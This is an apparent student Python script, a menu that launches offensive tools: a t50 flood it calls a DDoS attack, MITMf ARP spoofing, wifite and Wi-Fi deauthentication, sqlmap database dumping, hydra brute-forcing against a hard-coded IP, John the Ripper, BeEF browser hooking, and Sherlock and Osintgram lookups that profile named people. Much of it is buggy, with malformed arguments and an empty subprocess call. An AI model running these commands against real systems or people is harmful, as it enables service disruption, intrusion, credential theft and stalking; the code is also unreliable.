#!usr/bin/env python3

import subprocess
import time
import sys
import os



def animate():
    sys.stdout.write('\rThe list will be displayed now |')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now /')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now -')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now \\')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now |')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now /')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now -')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now \\')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now |')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now /')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now -')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now \\')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now /')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now -')
    time.sleep(0.1)
    sys.stdout.write('\rThe list will be displayed now \n\n')

def webinfo():

    print("Enter the URL of the website")
    url= input()
    subprocess.call(["dirb",url])
    print("The compiled list of all the associated web pages is displayed")


def webhack():
    print("The Zed Attack Proxy will perform an automated scan of the URL provided in the search column and will use the GET and POST method links in the website.\n")
    print("The highlited links can either be searched directly on a browser or used to gather information hidden to the viewers.")
    print("To install OWASP - ZAP press 1 or press 2 to run OWASP - Zap")
    options = input("Option:")
    if options == '1':
        subprocess.call(["sudo", "apt-get", "install", "zaproxy"])
    elif options == '2':
        print("Follow these steps as soon as the GUI boots up:")
        print("1.Select AUTOMATED SCAN\n")
        print("2.Enter the URL of a website of your choice")
        print("3.Press ATTACK")
        print("4.Wait for the scan to complete")
        print("5.Select the weblinks discovered in the scan and search for them in the browser to gain access")
        sys.stdout.write('\rThis is a GUI based tool so,please read the instructions carefully before executing.')
        time.sleep(0.1)
        subprocess.call("zaproxy")
    else:
        print("Please select between the given options")
print("Processing....")

def webstress():
    subprocess.call("clear")
    print("warning!:This is a DDoS attacking tool")
    print("This tool will crash the website with a certain number of packets.")
    print("Do not use this tool unless you own the server or authorized to do it")
    print("Press 1 to install the stress testing tool or Press 2 if you already have it installed:")
    inputstr = input()
    if inputstr == "1":
        subprocess.call(["sudo","apt-get","install","t50"])
    elif inputstr == "2":
        print("Enter the target IP Address:")
        ipinp = input()
        print("Please enter the protocol you want to use(Ex:TCP):")
        proto = input()
        subprocess.call(["sudo","t50",ipinp, "--flood","--turbo","-S", "--protocol", proto])
        print("The selected website is being tested for maximum stress/traffic it can handle")

def macc():
    subprocess.call("clear")
    print("The options available in System modification category are:")
    animate()
    print("1.MAC Changer to Random address\n")
    print("2.MAC Changer to Permanent address\n")
    print("Press 1 to execute Random MAC changer or \nPress 2 to execute Permanent MAC changer or \nPress 3 to install MAC Changer else press 0 to go back to the main menu")
    input1=input()
    if input1 == "1":
        print("Please enter the interface to change the address of (eth0 or wlan0):")
        interface = input("interface:")
        if interface == 'eth0' or interface == 'wlan0':
            print("Warning!!!! This will change your MAC address to a random MAC address")
            subprocess.call(["sudo","macchanger", '-r', interface])
            print("MAC address successfully changed to random address")
            animatecomplete()
            subprocess.call(["python3", "programlist.py"])
            
    elif input1 == "2":
        print("Please enter the interface to change the address of (eth0 or wlan0):")
        interface = input("interface:")
        if interface == 'eth0' or interface == 'wlan0':
            print("Warning!!!! This will change your MAC address to a permanent MAC address")
            subprocess.call(["sudo", "macchanger", '-p', interface])
            print("MAC address successfully changed to permanent address")
            animatecomplete()
            subprocess.call(["python3", "programlist.py"])
            
    elif input1 == "3":
            subprocess.call(["sudo","apt-get","install", "macchanger"])

    else:
        print("Interface not recognized")
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])



def mitm():
    print("To install MITMf press 1 or press 2 to run MITMf if you have it installed already")
    options1 = input("Option:")
    if options1 == '1':
        gitlink = input("Please input the link to clone from github")
        subprocess.call(["git", "clone", gitlink])
    elif options1 == '2':
        gateway = input("Please enter the gateway address:")
        target = input("Please enter the target address:")
        inter = input("Please enter the interface:")
        subprocess.call(["mitmf ", "--arp ", "--spoof ",gateway," --targets", target, " -i ", inter ])
        print("The Man-in-the-middle attack has been executed successfully")  
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        print("Please select between the given options")
     




def wifih():
    print("You must have an active wireless card to run this or else the program exits on its own!!")
    subprocess.call("wifite")
    print("The selected interface has been tested for its security successfully")

    animatecomplete()
    subprocess.call(["python3", "programlist.py"])
   


def socmedia():
    print("This module is implemented by using the works of Sherlock")
    uname = input("Enter the name of the person to check their registrations on various databases:")
    subprocess.call(["python3","sherlock",uname])
    print("This is the list of accounts associated with the username on various websites")
#web crawler or web scraper


def sqli():
    ##sqlmap - u http: // testphp.vulnweb.com / listproducts.php?cat =1 -dbs
    # sqlmap - u http: // testphp.vulnweb.com / listproducts.php?cat = 1 - D acuart - -tables
    # sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
    # sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump

    print("This module performs basic SQL injection operation")
    urldb=input("Enter a URL with a database linked to it(Ex:http://testphp.vulnweb.com/listproducts.php?cat=1):\n")
    subprocess.call(["sqlmap", "-u", urldb, "--dbs"])

    tablen = input("Enter the table name:")
    subprocess.call(["sqlmap", "-u", urldb, "-D",tablen,"--tables"])

    columnn= input("Enter the column name:")
    subprocess.call(["sqlmap", "-u", urldb, "-D", tablen, "-T", columnn, "--columns"])

    itemn= input("Enter the item name:")
    subprocess.call(["sqlmap", "-u", urldb, "-D", tablen, "-T", columnn, "-C", itemn, "--dump"])
    
    print("This is the table of contents of the associated database")

def jtr():
    print("The tool requires a file with hashes in it")
    print("If you have a hash file to crack, enter the hash file name.")
    print("If you do not have a hash file to crack, you can use the file we created for testing purposes(hashes.txt)")
    inputhash = input()
    subprocess.call(['sudo',  'john', inputhash])
    subprocess.call(['sudo', 'john', '--show', inputhash])

    print("The hashfile has been cracked successfully")


def hydra():
    print("The tool reqires the IP address of the webpage to bypass login")
    print("If you have an IP address to crack, enter it.")
    inputip  =input("Input the IP address along with the protocol or use the one we have provided(EX: ftp://103.53.40.92):")
    usrname = input("Please enter the username that you would like to try on the login page(Ex: user):")
    passlst = input("Please provide the password list or use the one we have provided(passlst.txt):")
    subprocess.call(['hydra', '-l', usrname, '-P', passlst, inputip])

    print("The website/webpage has been tested with the specified IP address")


def netmap():
    print("This module runs Nmap to describe network activities in different layers and protocols of the connected network")
    print("1.Enter the target IP address")
    inputip123 = input()
    
    subprocess.call(["nmap","-v","-sn", inputip123])
    print("The network specified was tested based on the parameters successfully")
    
    
def browhack():
    print("This module uses Browser Exploitation Framework to hook browsers and Exploit")
    print("Please press 1 to install beef or press 2 to start BeEF if you have already installed it:\n")
    options2 = input("Option:")
    if options2 == '1':
        giturl = input("Please enter the github url for beef-xss")
        subprocess.call(["git", " clone", giturl])
    elif options2 == '2':
        subprocess.call(["sudo","beef-xss","start"])
        print("The target browser has been compromised")
    else:
        print("Please select between the given options")


def netdeauth():
    print("This module is designed to de-authenticate the network for a specified amount of time")
    interf = input("Please enter the interface:\n")
    intefmon = input("Please enter the interface in monitor mode:\n")
    tbssid = input("Please enter the target BSSID:\n")
    tchan = input("Please enter the target channel:\n")
    subprocess.call(["airmon-ng", " start ", interf])
    subprocess.call(["airodump-ng ", intefmon])
    subprocess.call(["airodump-ng ","-d ",tbssid," -c", tchan, intefmon])
    print("The target network has been de-authenticated for the specified amount of time")

def osint():
    print("This module uses OSINT tools to trace Vehicle plates,phone numbers and other confidential data.")
    print("Use this tool for educational purposes only.")
    print("Neither do the developers of EDITH or OSINT tools take the responsibilty of the consequences of misuse of this tool")
    subprocess.call()


def webinfogat():
    subprocess.call("clear")
    print("The options available in Website Information Gathering category are:")
    animate()
    print("1.Webinfo\n")
    print("2.Website Vulnerability Assessment\n")
    print("3.DDoS attack")
    print("Press any one of the option numbers or else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        webinfo()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "2":
        webhack()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "3":
        print("Press Control+C to stop the attack")
        webstress()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])

def netinfogat():
    subprocess.call("clear")
    print("The options available in Network Testing category are:")
    animate()
    print("1.WiFi hacking (Wireless card required)\n")
    print("2.Nmap\n")
    print("3.Network de-authenticator(Wireless card required)\n")
    print("Press any one of the option numbers or else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        wifih()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "2":
        netmap()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "3":
        netdeauth()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])


def sniffspoof():
    subprocess.call("clear")
    print("The options available in Sniffing and Spoofing Techniques category are:")
    animate()
    print("1.Man-in-the-middle attack\n")
    print("2.Browser Exploitation framework\n")
    print("Press any one of the option numbers or else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        mitm()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "2":
        browhack()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])

def socmediagat():
    subprocess.call("clear")
    print("The options available in Social Media Information Gathering category are:")
    animate()
    print("1.User name database collection \n")
    print("2.Instagram information gathering \n")
    print("Press 1 to gather information or Press 2 to Instagram information gathering else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        socmedia()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    elif input1 == "2":
        insta()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])

def databaseatt():
    subprocess.call("clear")
    print("The options available in Database Attack category are:")
    animate()
    print("1.SQL Injection \n")
    print("Press 1 to perform the attack or else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        sqli()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])


def animatecomplete():
    sys.stdout.write('\rThe process has finished execution and displayed')
    time.sleep(15.0)

def animatehash():
    sys.stdout.write('\rThe password has been cracked and displayed')
    time.sleep(10.0)
    subprocess.call(["python3", "programlist.py"])



def passcrack():
    subprocess.call("clear")
    print("The options available in Password Cracking category are:")
    animate()
    print("1.Cracking Hashes\n")
    print("2.Bypassing Passwords on websites")
    print("Press any one of the option numbers or else press 0 to go back to the main menu")
    input1 = input()
    if input1 == "1":
        jtr()
        animatehash()
        animatehash()
        animatehash()
    if input1 == "2":
        hydra()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])

def apk():
    subprocess.call("clear")
    print("Press 1 to install APK reverse engineering tool")
    print("Press 2 to run the tool if you already have it installed")
    inputapk = input()
    if inputapk == "1":
        subprocess.call(["sudo", "apt-get", "install", "apktool"])
        apk()
    elif inputapk == "2":
        print("Please enter the APK file name or use the one we have provided(Ex:Flashlight_v8.10.10_apkpure.com.apk): ")
        apkfilename = input()
        subprocess.call(["apktool","d", apkfilename])
        print("The APK file has been cracked and the folder has been created in the same directory")
    else:
        print("Please choose any one of the options provided")

def reveng():
    subprocess.call("clear")
    print("The options available in Reverse Engineering category are:")
    animate()
    print("1.APK reverse engineering\n")
    print("Press 1 to execute APK reverse engineering else Press 0 to go to main main")
    inputrev = input()
    if inputrev == "1":
        apk()
        animatecomplete()
        subprocess.call(["python3", "programlist.py"])
    else:
        subprocess.call(["python3", "programlist.py"])

def insta():
    subprocess.call("clear")
    print("Press 1 to install OSINTgram")
    print("Press 2 to run the tool if you already have it installed")
    inputinsta = input()
    if inputinsta == "1":
        subprocess.call(["git", "clone", "https://github.com/Datalux/Osintgram.git"])
        insta()
    elif inputinsta == "2":
        print("Please enter the target's Instagram account name: \n")
        instaname = input()
        #subprocess.call("ls", cwd="Osintgram")
        os.chdir("/home/kali/Downloads/Project/Osintgram")
        subprocess.call(["python3", "main.py", instaname])
        animatecomplete()
        os.chdir("/home/kali/Downloads/Project")
        subprocess.call(["python3", "programlist.py"])
    else:
        print("Please choose any one of the options provided")

def home():
    subprocess.call(["python3", "edith.py"])

def selection(choice):

    if choice == 1:
        macc()
    elif choice == 2:
        webinfogat()
    elif choice == 3:
        netinfogat()
    elif choice == 4:
        sniffspoof()
    elif choice == 5:
        socmediagat()
    elif choice == 6:
        databaseatt()
    elif choice == 7:
        passcrack()
    elif choice == 8:
        reveng()
    elif choice == 0:
        home()
    # return switcher.get(choice,"Invalid option")
choice = int(input("Enter an option:\n"))
print(selection(choice))
